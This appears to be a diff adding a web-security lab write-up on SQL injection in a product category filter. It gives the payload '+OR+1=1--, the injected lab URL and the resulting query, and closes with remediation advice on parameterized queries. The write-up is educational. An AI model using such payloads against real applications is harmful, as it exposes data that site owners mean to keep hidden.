@@ -1,0 +1,21 @@
+The application passes user-supplied input directly into a SQL query without sanitization. When filtering products by category, the backend runs:
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+The released = 1 condition hides unreleased products from users. Since the category parameter is injectable, this filter can be completely bypassed.
+  Payload
+'+OR+1=1--
+Injected URL
+https://<LAB-ID>.web-security-academy.net/filter?category=Gifts'+OR+1=1--
+Resulting Query
+sqlSELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+Part                  Effect
+'                     Closes the category string
+OR 1=1                Makes the condition always true
+  --                  Comments out the rest of the query
+All products from all categories are returned
+Both released and unreleased products are exposed
+Bypasses business logic meant to hide sensitive inventory
+
+
+Use parameterized queries / prepared statements
+Never concatenate user input directly into SQL
+Apply input validation on all query parameters
